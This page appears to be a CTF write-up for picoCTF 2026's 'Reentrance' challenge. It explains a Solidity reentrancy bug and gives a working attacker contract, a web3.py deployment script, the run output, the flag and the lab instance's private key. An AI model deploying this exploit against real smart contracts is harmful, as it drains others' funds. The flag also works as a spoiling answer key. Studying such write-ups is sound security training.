@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF Reentrance @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF Blockchain Guide</h1>
+        <p>here's how to solve Reentrance</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the Blockchain Guides</a>
+            <hr>
+            <h2>Reentrance</h2>
+            <pre>Name: Reentrance
+Description: The lead developer at SecureBank Corp is back, and he's doubling down. After the last "incident," he claims he's patched the vault and created the ultimate, unhackable Ethereum contract. He's so confident, he's explicitly taunting the security team to try and break it. He says, "I've added the checks, I've added the balances. There is no way you can withdraw more than you own." Your mission: Wipe the smile off his face. Drain the vault down to 0 and force the contract to surrender the flag. Contract: here The eth chain is at: Eth node address: crystal-peak.picoctf.net:52058 More details can be found at here. NOTE: this server can take up to 5 minutes to start up. Please be patient.
+Author: OB
+Tags: Hard, Blockchain, picoCTF 2026
+Challenge from: picoCTF 2026
+Files: VulnBank.sol
+Hints:
+1. If a bank hands you cash before they update your account balance in their ledger, what is to stop you from getting back in line immediately?
+2. If the recipient is another contract, what function is triggered when it receives Ether?</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we'll need to drain the bank's balance to being broke at 0 money so that the flag can get revealed. The developer claims that it's absolutely impossible to withdraw more than we own, so that's exactly what we're going to try to break just to prove him wrong. So for that, we'll have to skip to the solution part to look at the contract and the details webpage we are given.</p>
+            <h2>Solution</h2>
+            <p>So looking at the contract everything looks almost fine, because yes, you can't withdraw more than you deposited, there's a check for that, but look at the rest of the function:</p>
+            <pre>function withdraw(uint amount) public {
+  require(balances[msg.sender] >= amount, "Insufficient funds available");
+
+  (bool sent, ) = msg.sender.call{value: amount}("");
+  balances[msg.sender] -= amount;
+
+  require(sent, "Transfer failed");
+
+  if (!revealed && address(this).balance == 0) {
+    revealed = true;
+    emit FlagRevealed(flag);
+  }
+}</pre>
+            <p>So there's the exploit, basically the contract first sends Ethereum to msg.sender, then it updates the balance AFTER that transaction, so it's backwards. Because when Ethereum is sent using .call, it can trigger code in the receiver (only if it's a contract), so that means we can re-enter the withdraw function before our balance is lowered back down. So now that that's clear, let's take a look at our credentials from the details webpage:</p>
+            <pre>Welcome
+Welcome to your private Ethereum CTF instance! Your goal is to exploit the reentrancy vulnerability to drain the internal balance of the target account.
+When the bank's on-chain balance reaches zero, the contract will automatically reveal the hidden flag.
+
+Bank Address:
+0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF
+
+Initial Internal Balance:
+10 ETH
+
+Your Address:
+0xD3b5be163C2Df0dEa3e7f46a917918E6Ac6D23Ef
+
+Your Private Key:
+0x4bbb6b1043ca3aff4e3c6bf76089f4b20056a028c3780105962f977395abce37
+
+Initial Internal Balance (used for Gas):
+5 ETH
+
+Instructions
+1. Connect to the provided Ethereum node.
+2. Review the smart contract and identify the vulnerability.
+3. Deploy an attacker contract using your secret-key account.
+4. Trigger the exploit and drain the bank's internal balance.
+5. This page updates automatically when the flag is revealed.</pre>
+            <p>Okay, now that we have that, we'll do first our own contract. We'll use this for the looping robber exploit by first, putting a little money into the bank, starting a withdrawal, then exploiting reentrancy to withdraw repeatedly until the bank is completely drained before its balance updates:</p>
+            <pre>pragma solidity ^0.6.12;
+
+interface IVulnBank {
+  function deposit() external payable;
+  function withdraw(uint amount) external;
+}
+
+contract NewContract {
+  IVulnBank public bank;
+  uint256 public attackAmount = 1 ether;
+
+  constructor(address _bank) public {
+    bank = IVulnBank(_bank);
+  }
+
+  function startHeist() external payable {
+    require(msg.value &gt;= attackAmount, "Need ETH");
+    bank.deposit{value: attackAmount}();
+    bank.withdraw(attackAmount);
+  }
+
+  receive() external payable {
+    uint bankRemaining = address(bank).balance;
+    if (bankRemaining &gt; 0) {
+      uint amountToTake = attackAmount;
+      if (bankRemaining &lt; attackAmount) {
+        amountToTake = bankRemaining;
+      }
+      bank.withdraw(amountToTake);
+    }
+  }
+}</pre>
+            <a href="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/Front_Running/New.sol" target="_blank">Download New.sol</a>
+            <p>Perfect, we have everything we need now. To create the exploit code, all we need to do now is initialize Web3 to see that we can connect, then enter our credentials and import the new contract exploit we created. Then we do a first transaction that deploys the contract, which does startHeist() so that it does the looped robbing attack, and finally when the bank's balance hits 0 we print the flag:</p>
+            <pre>from web3 import Web3
+from solcx import compile_source, install_solc
+
+w3 = Web3(Web3.HTTPProvider("http://crystal-peak.picoctf.net:52058"))
+print("is connec:", w3.is_connected())
+
+addr = "0xD3b5be163C2Df0dEa3e7f46a917918E6Ac6D23Ef"
+privkey = "0x4bbb6b1043ca3aff4e3c6bf76089f4b20056a028c3780105962f977395abce37"
+bandkress = "0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF"
+
+with open("New.sol", "r") as f: source = f.read()
+install_solc("0.6.12")
+cix = compile_source(source, solc_version="0.6.12")["&lt;stdin&gt;:NewContract"]
+ABI = cix["abi"]
+bytecode = cix["bin"]
+
+print("\ndeploy our contract")
+NewContract = w3.eth.contract(abi=ABI, bytecode=bytecode)
+non = w3.eth.get_transaction_count(addr)
+deploytx_hash = w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(NewContract.constructor(bandkress).build_transaction({"chainId":w3.eth.chain_id,"gas":3000000,"gasPrice":w3.eth.gas_price,"nonce":non}),private_key=privkey).raw_transaction)
+print(deploytx_hash.hex())
+tx_receipt = w3.eth.wait_for_transaction_receipt(deploytx_hash)
+attadd = tx_receipt.contractAddress
+print(attadd)
+print("\nexeCUTE startHeist()")
+contract = w3.eth.contract(address=attadd, abi=ABI)
+non = w3.eth.get_transaction_count(addr)
+attacktx_hash = w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(contract.functions.startHeist().build_transaction({"chainId":w3.eth.chain_id,"gas":5000000,"gasPrice":w3.eth.gas_price,"nonce":non,"value":w3.to_wei(1,"ether")}),private_key=privkey).raw_transaction)
+print(attacktx_hash.hex())
+print("\nwait to be mined")
+w3.eth.wait_for_transaction_receipt(attacktx_hash)
+final = w3.eth.get_balance(bandkress)
+print("result bank balance:", final)
+
+if final != 0:
+  print("bank no drain")
+print(w3.eth.contract(address=Web3.to_checksum_address(bandkress), abi=[{"name":"getFlag","type":"function","stateMutability":"view","inputs":[],"outputs":[{"type": "string"}]}]).functions.getFlag().call())</pre>
+            <a href="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/Front_Running/main.py" target="_blank">Download main.py</a>
+            <p>And if we run it, we should be able to get that flag:</p>
+            <pre>(venv) shukularuni@SHUKULAP:~/pctf26/blocain$ python3 reentrance.py
+is connec: True
+
+deploy our contract
+7ad2938d0e1cbd28b8cd52cb2cbca0c6f41e3f8f2ba7e6885565c91d090c87e2
+0xE50a8B131D0b19B25cDDc577bBc8a47543B8D7c1
+
+exeCUTE startHeist()
+c899644985b8450b62ab96a017a904cd8f4da3206169303f1136c46bc7f676f8
+
+wait to be mined
+result bank balance: 0
+picoCTF{UpDaTe_St4ate5_1st_7c58e46d}</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/753">https://play.picoctf.org/practice/challenge/753</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
